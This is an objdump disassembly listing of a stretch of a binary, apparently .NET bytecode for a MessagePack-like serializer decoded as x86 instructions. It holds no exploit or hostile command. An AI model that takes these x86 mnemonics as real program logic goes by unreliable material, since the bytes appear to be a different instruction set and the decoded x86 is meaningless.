  4051ae:	00 00                	add    %al,(%eax)
  4051b0:	06                   	push   %es
  4051b1:	09 17                	or     %edx,(%edi)
  4051b3:	58                   	pop    %eax
  4051b4:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  4051b9:	2a 06                	sub    (%esi),%al
  4051bb:	20 de                	and    %bl,%dh
  4051bd:	00 00                	add    %al,(%eax)
  4051bf:	00 40 55             	add    %al,0x55(%eax)
  4051c2:	00 00                	add    %al,(%eax)
  4051c4:	00 18                	add    %bl,(%eax)
  4051c6:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4051ca:	01 0b                	add    %ecx,(%ebx)
  4051cc:	03 07                	add    (%edi),%eax
  4051ce:	16                   	push   %ss
  4051cf:	18 6f 45             	sbb    %ch,0x45(%edi)
  4051d2:	00 00                	add    %al,(%eax)
  4051d4:	0a 26                	or     (%esi),%ah
  4051d6:	07                   	pop    %es
  4051d7:	28 58 00             	sub    %bl,0x0(%eax)
  4051da:	00 06                	add    %al,(%esi)
  4051dc:	0b 07                	or     (%edi),%eax
  4051de:	16                   	push   %ss
  4051df:	28 07                	sub    %al,(%edi)
  4051e1:	01 00                	add    %eax,(%eax)
  4051e3:	0a 0c 02             	or     (%edx,%eax,1),%cl
  4051e6:	28 6b 00             	sub    %ch,0x0(%ebx)
  4051e9:	00 06                	add    %al,(%esi)
  4051eb:	02 18                	add    (%eax),%bl
  4051ed:	7d 36                	jge    0x405225
  4051ef:	00 00                	add    %al,(%eax)
  4051f1:	04 16                	add    $0x16,%al
  4051f3:	0d 38 1c 00 00       	or     $0x1c38,%eax
  4051f8:	00 02                	add    %al,(%edx)
  4051fa:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  4051fe:	06                   	push   %es
  4051ff:	25 03 28 96 00       	and    $0x962803,%eax
  405204:	00 06                	add    %al,(%esi)
  405206:	6f                   	outsl  %ds:(%esi),(%dx)
  405207:	6a 00                	push   $0x0
  405209:	00 06                	add    %al,(%esi)
  40520b:	03 6f 88             	add    -0x78(%edi),%ebp
  40520e:	00 00                	add    %al,(%eax)
  405210:	06                   	push   %es
  405211:	09 17                	or     %edx,(%edi)
  405213:	58                   	pop    %eax
  405214:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405219:	2a 06                	sub    (%esi),%al
  40521b:	20 df                	and    %bl,%bh
  40521d:	00 00                	add    %al,(%eax)
  40521f:	00 40 55             	add    %al,0x55(%eax)
  405222:	00 00                	add    %al,(%eax)
  405224:	00 1a                	add    %bl,(%edx)
  405226:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40522a:	01 0b                	add    %ecx,(%ebx)
  40522c:	03 07                	add    (%edi),%eax
  40522e:	16                   	push   %ss
  40522f:	1a 6f 45             	sbb    0x45(%edi),%ch
  405232:	00 00                	add    %al,(%eax)
  405234:	0a 26                	or     (%esi),%ah
  405236:	07                   	pop    %es
  405237:	28 58 00             	sub    %bl,0x0(%eax)
  40523a:	00 06                	add    %al,(%esi)
  40523c:	0b 07                	or     (%edi),%eax
  40523e:	16                   	push   %ss
  40523f:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405243:	0a 0c 02             	or     (%edx,%eax,1),%cl
  405246:	28 6b 00             	sub    %ch,0x0(%ebx)
  405249:	00 06                	add    %al,(%esi)
  40524b:	02 18                	add    (%eax),%bl
  40524d:	7d 36                	jge    0x405285
  40524f:	00 00                	add    %al,(%eax)
  405251:	04 16                	add    $0x16,%al
  405253:	0d 38 1c 00 00       	or     $0x1c38,%eax
  405258:	00 02                	add    %al,(%edx)
  40525a:	28 6c 00 00          	sub    %ch,0x0(%eax,%eax,1)
  40525e:	06                   	push   %es
  40525f:	25 03 28 96 00       	and    $0x962803,%eax
  405264:	00 06                	add    %al,(%esi)
  405266:	6f                   	outsl  %ds:(%esi),(%dx)
  405267:	6a 00                	push   $0x0
  405269:	00 06                	add    %al,(%esi)
  40526b:	03 6f 88             	add    -0x78(%edi),%ebp
  40526e:	00 00                	add    %al,(%eax)
  405270:	06                   	push   %es
  405271:	09 17                	or     %edx,(%edi)
  405273:	58                   	pop    %eax
  405274:	0d 09 08 32 e0       	or     $0xe0320809,%eax
  405279:	2a 06                	sub    (%esi),%al
  40527b:	20 da                	and    %bl,%dl
  40527d:	00 00                	add    %al,(%eax)
  40527f:	00 40 0e             	add    %al,0xe(%eax)
  405282:	00 00                	add    %al,(%eax)
  405284:	00 02                	add    %al,(%edx)
  405286:	06                   	push   %es
  405287:	03 28                	add    (%eax),%ebp
  405289:	97                   	xchg   %eax,%edi
  40528a:	00 00                	add    %al,(%eax)
  40528c:	06                   	push   %es
  40528d:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  405293:	06                   	push   %es
  405294:	20 db                	and    %bl,%bl
  405296:	00 00                	add    %al,(%eax)
  405298:	00 40 0e             	add    %al,0xe(%eax)
  40529b:	00 00                	add    %al,(%eax)
  40529d:	00 02                	add    %al,(%edx)
  40529f:	06                   	push   %es
  4052a0:	03 28                	add    (%eax),%ebp
  4052a2:	97                   	xchg   %eax,%edi
  4052a3:	00 00                	add    %al,(%eax)
  4052a5:	06                   	push   %es
  4052a6:	28 81 00 00 06 2a    	sub    %al,0x2a060000(%ecx)
  4052ac:	06                   	push   %es
  4052ad:	20 d0                	and    %dl,%al
  4052af:	00 00                	add    %al,(%eax)
  4052b1:	00 40 0f             	add    %al,0xf(%eax)
  4052b4:	00 00                	add    %al,(%eax)
  4052b6:	00 02                	add    %al,(%edx)
  4052b8:	03 6f 00             	add    0x0(%edi),%ebp
  4052bb:	01 00                	add    %eax,(%eax)
  4052bd:	0a 67 6a             	or     0x6a(%edi),%ah
  4052c0:	28 74 00 00          	sub    %dh,0x0(%eax,%eax,1)
  4052c4:	06                   	push   %es
  4052c5:	2a 06                	sub    (%esi),%al
  4052c7:	20 d1                	and    %dl,%cl
  4052c9:	00 00                	add    %al,(%eax)
  4052cb:	00 40 27             	add    %al,0x27(%eax)
  4052ce:	00 00                	add    %al,(%eax)
  4052d0:	00 18                	add    %bl,(%eax)
  4052d2:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4052d6:	01 0b                	add    %ecx,(%ebx)
  4052d8:	03 07                	add    (%edi),%eax
  4052da:	16                   	push   %ss
  4052db:	18 6f 45             	sbb    %ch,0x45(%edi)
  4052de:	00 00                	add    %al,(%eax)
  4052e0:	0a 26                	or     (%esi),%ah
  4052e2:	07                   	pop    %es
  4052e3:	28 58 00             	sub    %bl,0x0(%eax)
  4052e6:	00 06                	add    %al,(%esi)
  4052e8:	0b 02                	or     (%edx),%eax
  4052ea:	07                   	pop    %es
  4052eb:	16                   	push   %ss
  4052ec:	28 07                	sub    %al,(%edi)
  4052ee:	01 00                	add    %eax,(%eax)
  4052f0:	0a 6a 28             	or     0x28(%edx),%ch
  4052f3:	74 00                	je     0x4052f5
  4052f5:	00 06                	add    %al,(%esi)
  4052f7:	2a 06                	sub    (%esi),%al
  4052f9:	20 d2                	and    %dl,%dl
  4052fb:	00 00                	add    %al,(%eax)
  4052fd:	00 40 27             	add    %al,0x27(%eax)
  405300:	00 00                	add    %al,(%eax)
  405302:	00 1a                	add    %bl,(%edx)
  405304:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  405308:	01 0b                	add    %ecx,(%ebx)
  40530a:	03 07                	add    (%edi),%eax
  40530c:	16                   	push   %ss
  40530d:	1a 6f 45             	sbb    0x45(%edi),%ch
  405310:	00 00                	add    %al,(%eax)
  405312:	0a 26                	or     (%esi),%ah
  405314:	07                   	pop    %es
  405315:	28 58 00             	sub    %bl,0x0(%eax)
  405318:	00 06                	add    %al,(%esi)
  40531a:	0b 02                	or     (%edx),%eax
  40531c:	07                   	pop    %es
  40531d:	16                   	push   %ss
  40531e:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  405322:	0a 6a 28             	or     0x28(%edx),%ch
  405325:	74 00                	je     0x405327
  405327:	00 06                	add    %al,(%esi)
  405329:	2a 06                	sub    (%esi),%al
  40532b:	20 d3                	and    %dl,%bl
  40532d:	00 00                	add    %al,(%eax)
  40532f:	00 40 25             	add    %al,0x25(%eax)
  405332:	00 00                	add    %al,(%eax)
  405334:	00 1e                	add    %bl,(%esi)
  405336:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40533a:	01 0b                	add    %ecx,(%ebx)
  40533c:	03 07                	add    (%edi),%eax
  40533e:	16                   	push   %ss
  40533f:	1e                   	push   %ds
  405340:	6f                   	outsl  %ds:(%esi),(%dx)
  405341:	45                   	inc    %ebp
  405342:	00 00                	add    %al,(%eax)
  405344:	0a 26                	or     (%esi),%ah
  405346:	07                   	pop    %es
  405347:	28 58 00             	sub    %bl,0x0(%eax)
  40534a:	00 06                	add    %al,(%esi)
  40534c:	0b 02                	or     (%edx),%eax
  40534e:	07                   	pop    %es
  40534f:	16                   	push   %ss
  405350:	28 08                	sub    %cl,(%eax)
  405352:	01 00                	add    %eax,(%eax)
  405354:	0a 28                	or     (%eax),%ch
  405356:	74 00                	je     0x405358
  405358:	00 06                	add    %al,(%esi)
  40535a:	2a 00                	sub    (%eax),%al
  40535c:	1b 30                	sbb    (%eax),%esi
  40535e:	04 00                	add    $0x0,%al
  405360:	4d                   	dec    %ebp
  405361:	00 00                	add    %al,(%eax)
  405363:	00 27                	add    %ah,(%edi)
  405365:	00 00                	add    %al,(%eax)
  405367:	11 73 d0             	adc    %esi,-0x30(%ebx)
  40536a:	00 00                	add    %al,(%eax)
  40536c:	0a 0a                	or     (%edx),%cl
  40536e:	02 06                	add    (%esi),%al
  405370:	28 8a 00 00 06 06    	sub    %cl,0x6060000(%edx)
  405376:	6f                   	outsl  %ds:(%esi),(%dx)
  405377:	e2 00                	loop   0x405379
  405379:	00 0a                	add    %cl,(%edx)
  40537b:	d4 8d                	aam    $0x8d
  40537d:	44                   	inc    %esp
  40537e:	00 00                	add    %al,(%eax)
  405380:	01 0b                	add    %ecx,(%ebx)
  405382:	06                   	push   %es
  405383:	16                   	push   %ss
  405384:	6a 6f                	push   $0x6f
  405386:	4e                   	dec    %esi
  405387:	00 00                	add    %al,(%eax)
  405389:	0a 06                	or     (%esi),%al
  40538b:	07                   	pop    %es
  40538c:	16                   	push   %ss
  40538d:	06                   	push   %es
  40538e:	6f                   	outsl  %ds:(%esi),(%dx)
  40538f:	e2 00                	loop   0x405391
  405391:	00 0a                	add    %cl,(%edx)
  405393:	69 6f 45 00 00 0a 26 	imul   $0x260a0000,0x45(%edi),%ebp
  40539a:	07                   	pop    %es
  40539b:	28 a3 00 00 06 0c    	sub    %ah,0xc060000(%ebx)
  4053a1:	dd 0d 00 00 00 06    	fisttpll 0x6000000
  4053a7:	39 06                	cmp    %eax,(%esi)
  4053a9:	00 00                	add    %al,(%eax)
  4053ab:	00 06                	add    %al,(%esi)
  4053ad:	6f                   	outsl  %ds:(%esi),(%dx)
  4053ae:	33 00                	xor    (%eax),%eax
  4053b0:	00 0a                	add    %cl,(%edx)
  4053b2:	dc 08                	fmull  (%eax)
  4053b4:	2a 00                	sub    (%eax),%al
  4053b6:	00 00                	add    %al,(%eax)
  4053b8:	01 10                	add    %edx,(%eax)
  4053ba:	00 00                	add    %al,(%eax)
  4053bc:	02 00                	add    (%eax),%al
  4053be:	06                   	push   %es
  4053bf:	00 38                	add    %bh,(%eax)
  4053c1:	3e 00 0d 00 00 00 00 	add    %cl,%ds:0x0
  4053c8:	13 30                	adc    (%eax),%esi
  4053ca:	02 00                	add    (%eax),%al
  4053cc:	ec                   	in     (%dx),%al
  4053cd:	00 00                	add    %al,(%eax)
  4053cf:	00 20                	add    %ah,(%eax)
  4053d1:	00 00                	add    %al,(%eax)
  4053d3:	11 02                	adc    %eax,(%edx)
  4053d5:	7b 36                	jnp    0x40540d
  4053d7:	00 00                	add    %al,(%eax)
  4053d9:	04 0a                	add    $0xa,%al
  4053db:	06                   	push   %es
  4053dc:	45                   	inc    %ebp
  4053dd:	0c 00                	or     $0x0,%al
  4053df:	00 00                	add    %al,(%eax)
  4053e1:	05 00 00 00 05       	add    $0x5000000,%eax
  4053e6:	00 00                	add    %al,(%eax)
  4053e8:	00 98 00 00 00 a0    	add    %bl,-0x60000000(%eax)
  4053ee:	00 00                	add    %al,(%eax)
  4053f0:	00 0c 00             	add    %cl,(%eax,%eax,1)
  4053f3:	00 00                	add    %al,(%eax)
  4053f5:	1e                   	push   %ds
  4053f6:	00 00                	add    %al,(%eax)
  4053f8:	00 30                	add    %dh,(%eax)
  4053fa:	00 00                	add    %al,(%eax)
  4053fc:	00 42 00             	add    %al,0x0(%edx)
  4053ff:	00 00                	add    %al,(%eax)
  405401:	54                   	push   %esp
  405402:	00 00                	add    %al,(%eax)
  405404:	00 66 00             	add    %ah,0x0(%esi)
  405407:	00 00                	add    %al,(%eax)
  405409:	79 00                	jns    0x40540b
  40540b:	00 00                	add    %al,(%eax)
  40540d:	86 00                	xchg   %al,(%eax)
  40540f:	00 00                	add    %al,(%eax)
  405411:	38 a3 00 00 00 03    	cmp    %ah,0x3000000(%ebx)
  405417:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  40541d:	03 02                	add    (%edx),%eax
  40541f:	7b 35                	jnp    0x405456
  405421:	00 00                	add    %al,(%eax)
  405423:	04 74                	add    $0x74,%al
  405425:	38 00                	cmp    %al,(%eax)
  405427:	00 01                	add    %al,(%ecx)
  405429:	28 9a 00 00 06 2a    	sub    %bl,0x2a060000(%edx)
  40542f:	03 02                	add    (%edx),%eax
  405431:	7b 35                	jnp    0x405468
  405433:	00 00                	add    %al,(%eax)
  405435:	04 a5                	add    $0xa5,%al
  405437:	68 00 00 01 28       	push   $0x28010000
  40543c:	a0 00 00 06 2a       	mov    0x2a060000,%al
  405441:	03 02                	add    (%edx),%eax
  405443:	7b 35                	jnp    0x40547a
  405445:	00 00                	add    %al,(%eax)
  405447:	04 a5                	add    $0xa5,%al
  405449:	95                   	xchg   %eax,%ebp
  40544a:	00 00                	add    %al,(%eax)
  40544c:	01 28                	add    %ebp,(%eax)
  40544e:	9f                   	lahf
  40544f:	00 00                	add    %al,(%eax)
  405451:	06                   	push   %es
  405452:	2a 03                	sub    (%ebx),%al
  405454:	02 7b 35             	add    0x35(%ebx),%bh
  405457:	00 00                	add    %al,(%eax)
  405459:	04 a5                	add    $0xa5,%al
  40545b:	6c                   	insb   (%dx),%es:(%edi)
  40545c:	00 00                	add    %al,(%eax)
  40545e:	01 28                	add    %ebp,(%eax)
  405460:	9e                   	sahf
  405461:	00 00                	add    %al,(%eax)
  405463:	06                   	push   %es
  405464:	2a 03                	sub    (%ebx),%al
  405466:	02 7b 35             	add    0x35(%ebx),%bh
  405469:	00 00                	add    %al,(%eax)
  40546b:	04 a5                	add    $0xa5,%al
  40546d:	96                   	xchg   %eax,%esi
  40546e:	00 00                	add    %al,(%eax)
  405470:	01 28                	add    %ebp,(%eax)
  405472:	9c                   	pushf
  405473:	00 00                	add    %al,(%eax)
  405475:	06                   	push   %es
  405476:	2a 03                	sub    (%ebx),%al
  405478:	02 7b 35             	add    0x35(%ebx),%bh
  40547b:	00 00                	add    %al,(%eax)
  40547d:	04 a5                	add    $0xa5,%al
  40547f:	97                   	xchg   %eax,%edi
  405480:	00 00                	add    %al,(%eax)
  405482:	01 6c 28 9c          	add    %ebp,-0x64(%eax,%ebp,1)
  405486:	00 00                	add    %al,(%eax)
  405488:	06                   	push   %es
  405489:	2a 03                	sub    (%ebx),%al
  40548b:	02 28                	add    (%eax),%ch
  40548d:	77 00                	ja     0x40548f
  40548f:	00 06                	add    %al,(%esi)
  405491:	28 a0 00 00 06 2a    	sub    %ah,0x2a060000(%eax)
  405497:	03 02                	add    (%edx),%eax
  405499:	7b 35                	jnp    0x4054d0
  40549b:	00 00                	add    %al,(%eax)
  40549d:	04 74                	add    $0x74,%al
  40549f:	02 00                	add    (%eax),%al
  4054a1:	00 1b                	add    %bl,(%ebx)
  4054a3:	28 9b 00 00 06 2a    	sub    %bl,0x2a060000(%ebx)
  4054a9:	02 03                	add    (%ebx),%al
  4054ab:	28 72 00             	sub    %dh,0x0(%edx)
  4054ae:	00 06                	add    %al,(%esi)
  4054b0:	2a 02                	sub    (%edx),%al
  4054b2:	03 28                	add    (%eax),%ebp
  4054b4:	73 00                	jae    0x4054b6
  4054b6:	00 06                	add    %al,(%esi)
  4054b8:	2a 03                	sub    (%ebx),%al
  4054ba:	28 99 00 00 06 2a    	sub    %bl,0x2a060000(%ecx)
  4054c0:	1b 30                	sbb    (%eax),%esi
  4054c2:	03 00                	add    (%eax),%eax
  4054c4:	42                   	inc    %edx
  4054c5:	00 00                	add    %al,(%eax)
  4054c7:	00 28                	add    %ch,(%eax)
  4054c9:	00 00                	add    %al,(%eax)
  4054cb:	11 02                	adc    %eax,(%edx)
  4054cd:	0a 16                	or     (%esi),%dl
  4054cf:	0b 06                	or     (%esi),%eax
  4054d1:	12 01                	adc    (%ecx),%al
  4054d3:	28 49 00             	sub    %cl,0x0(%ecx)
  4054d6:	00 0a                	add    %cl,(%edx)
  4054d8:	02 7b 39             	add    0x39(%ebx),%bh
  4054db:	00 00                	add    %al,(%eax)
  4054dd:	04 3a                	add    $0x3a,%al
  4054df:	12 00                	adc    (%eax),%al
  4054e1:	00 00                	add    %al,(%eax)
  4054e3:	02 02                	add    (%edx),%al
  4054e5:	02 7b 38             	add    0x38(%ebx),%bh
  4054e8:	00 00                	add    %al,(%eax)
  4054ea:	04 73                	add    $0x73,%al
  4054ec:	63 00                	arpl   %eax,(%eax)
  4054ee:	00 06                	add    %al,(%esi)
  4054f0:	7d 39                	jge    0x40552b
  4054f2:	00 00                	add    %al,(%eax)
  4054f4:	04 dd                	add    $0xdd,%al
  4054f6:	0d 00 00 00 07       	or     $0x7000000,%eax
  4054fb:	39 06                	cmp    %eax,(%esi)
  4054fd:	00 00                	add    %al,(%eax)
  4054ff:	00 06                	add    %al,(%esi)
  405501:	28 50 00             	sub    %dl,0x0(%eax)
  405504:	00 0a                	add    %cl,(%edx)
  405506:	dc 02                	faddl  (%edx)
  405508:	7b 39                	jnp    0x405543
  40550a:	00 00                	add    %al,(%eax)
  40550c:	04 2a                	add    $0x2a,%al
  40550e:	00 00                	add    %al,(%eax)
  405510:	01 10                	add    %edx,(%eax)
  405512:	00 00                	add    %al,(%eax)
  405514:	02 00                	add    (%eax),%al
  405516:	04 00                	add    $0x0,%al
  405518:	2a 2e                	sub    (%esi),%ch
  40551a:	00 0d 00 00 00 00    	add    %cl,0x0
  405520:	13 30                	adc    (%eax),%esi
  405522:	04 00                	add    $0x0,%al
  405524:	18 00                	sbb    %al,(%eax)
  405526:	00 00                	add    %al,(%eax)
  405528:	29 00                	sub    %eax,(%eax)
  40552a:	00 11                	add    %dl,(%ecx)
  40552c:	03 8d 44 00 00 01    	add    0x1000044(%ebp),%ecx
  405532:	0a 02                	or     (%edx),%al
  405534:	06                   	push   %es
  405535:	16                   	push   %ss
  405536:	03 6f 45             	add    0x45(%edi),%ebp
  405539:	00 00                	add    %al,(%eax)
  40553b:	0a 26                	or     (%esi),%ah
  40553d:	06                   	push   %es
  40553e:	28 55 00             	sub    %dl,0x0(%ebp)
  405541:	00 06                	add    %al,(%esi)
  405543:	2a 13                	sub    (%ebx),%dl
  405545:	30 04 00             	xor    %al,(%eax,%eax,1)
  405548:	b1 00                	mov    $0x0,%cl
  40554a:	00 00                	add    %al,(%eax)
  40554c:	2a 00                	sub    (%eax),%al
  40554e:	00 11                	add    %dl,(%ecx)
  405550:	14 0a                	adc    $0xa,%al
  405552:	16                   	push   %ss
  405553:	0b 02                	or     (%edx),%eax
  405555:	20 a0 00 00 00 3f    	and    %ah,0x3f000000(%eax)
  40555b:	18 00                	sbb    %al,(%eax)
  40555d:	00 00                	add    %al,(%eax)
  40555f:	02 20                	add    (%eax),%ah
  405561:	bf 00 00 00 3d       	mov    $0x3d000000,%edi
  405566:	0d 00 00 00 02       	or     $0x2000000,%eax
  40556b:	20 a0 00 00 00 59    	and    %ah,0x59000000(%eax)
  405571:	0b 38                	or     (%eax),%edi
  405573:	72 00                	jb     0x405575
  405575:	00 00                	add    %al,(%eax)
  405577:	02 20                	add    (%eax),%ah
  405579:	d9 00                	flds   (%eax)
  40557b:	00 00                	add    %al,(%eax)
  40557d:	40                   	inc    %eax
  40557e:	0c 00                	or     $0x0,%al
  405580:	00 00                	add    %al,(%eax)
  405582:	03 6f 00             	add    0x0(%edi),%ebp
  405585:	01 00                	add    %eax,(%eax)
  405587:	0a 0b                	or     (%ebx),%cl
  405589:	38 5b 00             	cmp    %bl,0x0(%ebx)
  40558c:	00 00                	add    %al,(%eax)
  40558e:	02 20                	add    (%eax),%ah
  405590:	da 00                	fiaddl (%eax)
  405592:	00 00                	add    %al,(%eax)
  405594:	40                   	inc    %eax
  405595:	25 00 00 00 18       	and    $0x18000000,%eax
  40559a:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  40559e:	01 0a                	add    %ecx,(%edx)
  4055a0:	03 06                	add    (%esi),%eax
  4055a2:	16                   	push   %ss
  4055a3:	18 6f 45             	sbb    %ch,0x45(%edi)
  4055a6:	00 00                	add    %al,(%eax)
  4055a8:	0a 26                	or     (%esi),%ah
  4055aa:	06                   	push   %es
  4055ab:	28 58 00             	sub    %bl,0x0(%eax)
  4055ae:	00 06                	add    %al,(%esi)
  4055b0:	0a 06                	or     (%esi),%al
  4055b2:	16                   	push   %ss
  4055b3:	28 02                	sub    %al,(%edx)
  4055b5:	01 00                	add    %eax,(%eax)
  4055b7:	0a 0b                	or     (%ebx),%cl
  4055b9:	38 2b                	cmp    %ch,(%ebx)
  4055bb:	00 00                	add    %al,(%eax)
  4055bd:	00 02                	add    %al,(%edx)
  4055bf:	20 db                	and    %bl,%bl
  4055c1:	00 00                	add    %al,(%eax)
  4055c3:	00 40 20             	add    %al,0x20(%eax)
  4055c6:	00 00                	add    %al,(%eax)
  4055c8:	00 1a                	add    %bl,(%edx)
  4055ca:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055ce:	01 0a                	add    %ecx,(%edx)
  4055d0:	03 06                	add    (%esi),%eax
  4055d2:	16                   	push   %ss
  4055d3:	1a 6f 45             	sbb    0x45(%edi),%ch
  4055d6:	00 00                	add    %al,(%eax)
  4055d8:	0a 26                	or     (%esi),%ah
  4055da:	06                   	push   %es
  4055db:	28 58 00             	sub    %bl,0x0(%eax)
  4055de:	00 06                	add    %al,(%esi)
  4055e0:	0a 06                	or     (%esi),%al
  4055e2:	16                   	push   %ss
  4055e3:	28 44 00 00          	sub    %al,0x0(%eax,%eax,1)
  4055e7:	0a 0b                	or     (%ebx),%cl
  4055e9:	07                   	pop    %es
  4055ea:	8d 44 00 00          	lea    0x0(%eax,%eax,1),%eax
  4055ee:	01 0a                	add    %ecx,(%edx)
  4055f0:	03 06                	add    (%esi),%eax
  4055f2:	16                   	push   %ss
  4055f3:	07                   	pop    %es
  4055f4:	6f                   	outsl  %ds:(%esi),(%dx)
  4055f5:	45                   	inc    %ebp
  4055f6:	00 00                	add    %al,(%eax)
  4055f8:	0a 26                	or     (%esi),%ah
  4055fa:	06                   	push   %es
  4055fb:	28 55 00             	sub    %dl,0x0(%ebp)
  4055fe:	00 06                	add    %al,(%esi)
  405600:	2a 00                	sub    (%eax),%al
  405602:	00 00                	add    %al,(%eax)
  405604:	13 30                	adc    (%eax),%esi
  405606:	04 00                	add    $0x0,%al
  405608:	b9 00 00 00 2b       	mov    $0x2b000000,%ecx
  40560d:	00 00                	add    %al,(%eax)
  40560f:	11 03                	adc    %eax,(%ebx)
  405611:	28 54 00 00          	sub    %dl,0x0(%eax,%eax,1)
  405615:	06                   	push   %es
  405616:	0a 14 0b             	or     (%ebx,%ecx,1),%dl
  405619:	06                   	push   %es
  40561a:	8e 69 0c             	mov    0xc(%ecx),%gs
  40561d:	16                   	push   %ss
  40561e:	0d 08 1f 1f 3d       	or     $0x3d1f1f08,%eax
  405623:	16                   	push   %ss
  405624:	00 00                	add    %al,(%eax)
  405626:	00 20                	add    %ah,(%eax)
  405628:	a0 00 00 00 08       	mov    0x8000000,%al
  40562d:	d2 58 d2             	rcrb   %cl,-0x2e(%eax)
  405630:	0d 02 09 6f ee       	or     $0xee6f0902,%eax
  405635:	00 00                	add    %al,(%eax)
  405637:	0a 38                	or     (%eax),%bh
  405639:	80 00 00             	addb   $0x0,(%eax)
  40563c:	00 08                	add    %cl,(%eax)
  40563e:	20 ff                	and    %bh,%bh
  405640:	00 00                	add    %al,(%eax)
  405642:	00 3d 1c 00 00 00    	add    %bh,0x1c
  405648:	20 d9                	and    %bl,%cl
  40564a:	00 00                	add    %al,(%eax)
  40564c:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  405652:	00 00                	add    %al,(%eax)
  405654:	0a 08                	or     (%eax),%cl
  405656:	d2 0d 02 09 6f ee    	rorb   %cl,0xee6f0902
  40565c:	00 00                	add    %al,(%eax)
  40565e:	0a 38                	or     (%eax),%bh
  405660:	59                   	pop    %ecx
  405661:	00 00                	add    %al,(%eax)
  405663:	00 08                	add    %cl,(%eax)
  405665:	20 ff                	and    %bh,%bh
  405667:	ff 00                	incl   (%eax)
  405669:	00 3d 2a 00 00 00    	add    %bh,0x2a
  40566f:	20 da                	and    %bl,%dl
  405671:	00 00                	add    %al,(%eax)
  405673:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  405679:	00 00                	add    %al,(%eax)
  40567b:	0a 08                	or     (%eax),%cl
  40567d:	68 28 ef 00 00       	push   $0xef28
  405682:	0a 28                	or     (%eax),%ch
  405684:	58                   	pop    %eax
  405685:	00 00                	add    %al,(%eax)
  405687:	06                   	push   %es
  405688:	0b 02                	or     (%edx),%eax
  40568a:	07                   	pop    %es
  40568b:	16                   	push   %ss
  40568c:	07                   	pop    %es
  40568d:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405690:	4c                   	dec    %esp
  405691:	00 00                	add    %al,(%eax)
  405693:	0a 38                	or     (%eax),%bh
  405695:	24 00                	and    $0x0,%al
  405697:	00 00                	add    %al,(%eax)
  405699:	20 db                	and    %bl,%bl
  40569b:	00 00                	add    %al,(%eax)
  40569d:	00 0d 02 09 6f ee    	add    %cl,0xee6f0902
  4056a3:	00 00                	add    %al,(%eax)
  4056a5:	0a 08                	or     (%eax),%cl
  4056a7:	28 4a 00             	sub    %cl,0x0(%edx)
  4056aa:	00 0a                	add    %cl,(%edx)
  4056ac:	28 58 00             	sub    %bl,0x0(%eax)
  4056af:	00 06                	add    %al,(%esi)
  4056b1:	0b 02                	or     (%edx),%eax
  4056b3:	07                   	pop    %es
  4056b4:	16                   	push   %ss
  4056b5:	07                   	pop    %es
  4056b6:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056b9:	4c                   	dec    %esp
  4056ba:	00 00                	add    %al,(%eax)
  4056bc:	0a 02                	or     (%edx),%al
  4056be:	06                   	push   %es
  4056bf:	16                   	push   %ss
  4056c0:	06                   	push   %es
  4056c1:	8e 69 6f             	mov    0x6f(%ecx),%gs
  4056c4:	4c                   	dec    %esp
  4056c5:	00 00                	add    %al,(%eax)
  4056c7:	0a 2a                	or     (%edx),%ch
  4056c9:	00 00                	add    %al,(%eax)
  4056cb:	00 13                	add    %dl,(%ebx)
  4056cd:	30 04 00             	xor    %al,(%eax,%eax,1)
  4056d0:	94                   	xchg   %eax,%esp
  4056d1:	00 00                	add    %al,(%eax)
  4056d3:	00 2c 00             	add    %ch,(%eax,%eax,1)
  4056d6:	00 11                	add    %dl,(%ecx)
  4056d8:	14 0a                	adc    $0xa,%al
  4056da:	03 8e 69 0b 16 0c    	add    0xc160b69(%esi),%ecx
  4056e0:	07                   	pop    %es
  4056e1:	20 ff                	and    %bh,%bh
  4056e3:	00 00                	add    %al,(%eax)
  4056e5:	00 3d 1c 00 00 00    	add    %bh,0x1c
  4056eb:	20 c4                	and    %al,%ah
  4056ed:	00 00                	add    %al,(%eax)
  4056ef:	00 0c 02             	add    %cl,(%edx,%eax,1)
  4056f2:	08 6f ee             	or     %ch,-0x12(%edi)
  4056f5:	00 00                	add    %al,(%eax)
  4056f7:	0a 07                	or     (%edi),%al
  4056f9:	d2 0c 02             	rorb   %cl,(%edx,%eax,1)
  4056fc:	08 6f ee             	or     %ch,-0x12(%edi)
  4056ff:	00 00                	add    %al,(%eax)
  405701:	0a 38                	or     (%eax),%bh
  405703:	59                   	pop    %ecx
  405704:	00 00                	add    %al,(%eax)
  405706:	00 07                	add    %al,(%edi)
  405708:	20 ff                	and    %bh,%bh
  40570a:	ff 00                	incl   (%eax)
  40570c:	00 3d 2a 00 00 00    	add    %bh,0x2a
  405712:	20 c5                	and    %al,%ch
  405714:	00 00                	add    %al,(%eax)
  405716:	00 0c 02             	add    %cl,(%edx,%eax,1)
  405719:	08 6f ee             	or     %ch,-0x12(%edi)
  40571c:	00 00                	add    %al,(%eax)
  40571e:	0a 07                	or     (%edi),%al
  405720:	68 28 ef 00 00       	push   $0xef28
  405725:	0a 28                	or     (%eax),%ch
  405727:	58                   	pop    %eax
  405728:	00 00                	add    %al,(%eax)
  40572a:	06                   	push   %es
  40572b:	0a 02                	or     (%edx),%al
  40572d:	06                   	push   %es
  40572e:	16                   	push   %ss
  40572f:	06                   	push   %es
  405730:	8e 69 6f             	mov    0x6f(%ecx),%gs
  405733:	4c                   	dec    %esp
  405734:	00 00                	add    %al,(%eax)
  405736:	0a 38                	or     (%eax),%bh
  405738:	24 00                	and    $0x0,%al
  40573a:	00 00                	add    %al,(%eax)
  40573c:	20 c6                	and    %al,%dh
  40573e:	00 00                	add    %al,(%eax)
